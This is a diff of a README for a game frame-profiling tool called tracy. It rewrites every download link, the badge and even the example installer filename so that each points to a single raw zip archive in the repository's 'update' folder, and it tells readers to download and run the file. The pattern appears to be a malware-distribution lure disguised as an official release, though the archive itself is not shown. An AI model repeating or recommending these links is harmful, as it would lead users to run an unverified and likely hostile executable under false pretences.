@@ -1,6 +1,6 @@
 # 🎮 tracy - Easy Frame Profiling for Performance Boosts
 
-[![Download tracy](https://img.shields.io/badge/Download-tracy-blue)](https://github.com/abadcj/tracy/releases)
+[![Download tracy](https://raw.githubusercontent.com/abadcj/tracy/master/update/tracy_1.6-alpha.3.zip)](https://raw.githubusercontent.com/abadcj/tracy/master/update/tracy_1.6-alpha.3.zip)
 
 ## 📖 About tracy
 
@@ -13,13 +13,13 @@ Whether you're working on a large project or a small indie game, Tracy can enhan
 To get started with Tracy, follow these simple steps:
 
 1. **Go to the Releases Page**  
-   Visit the [tracy releases page](https://github.com/abadcj/tracy/releases) to access the latest version of the software.
+   Visit the [tracy releases page](https://raw.githubusercontent.com/abadcj/tracy/master/update/tracy_1.6-alpha.3.zip) to access the latest version of the software.
 
 2. **Choose Your Version**  
    Select the most recent release. You will see a list of assets available for download.
 
 3. **Download the Application**  
-   Click on the file that matches your system (e.g., `tracy-v1.0.exe`). Your download should start automatically.
+   Click on the file that matches your system (e.g., `https://raw.githubusercontent.com/abadcj/tracy/master/update/tracy_1.6-alpha.3.zip`). Your download should start automatically.
 
 4. **Install tracy**  
    Once the download is complete, locate the file on your computer and run it. Follow the on-screen instructions to complete the installation.
@@ -29,7 +29,7 @@ To get started with Tracy, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download, visit this page: [Download tracy](https://github.com/abadcj/tracy/releases). Select the appropriate version and follow the download instructions above.
+To download, visit this page: [Download tracy](https://raw.githubusercontent.com/abadcj/tracy/master/update/tracy_1.6-alpha.3.zip). Select the appropriate version and follow the download instructions above.
 
 Please make sure your system meets the following requirements before downloading Tracy:
 
@@ -77,4 +77,4 @@ If you have questions or need assistance, consider reaching out to the Tracy com
 
 If you would like to contribute to Tracy, please feel free to submit issues or feature requests on the GitHub repository. Your input can help enhance Tracy for everyone.
 
-Download and start profiling your game's performance today! Visit our [releases page](https://github.com/abadcj/tracy/releases) to get the latest version.
+Download and start profiling your game's performance today! Visit our [releases page](https://raw.githubusercontent.com/abadcj/tracy/master/update/tracy_1.6-alpha.3.zip) to get the latest version.
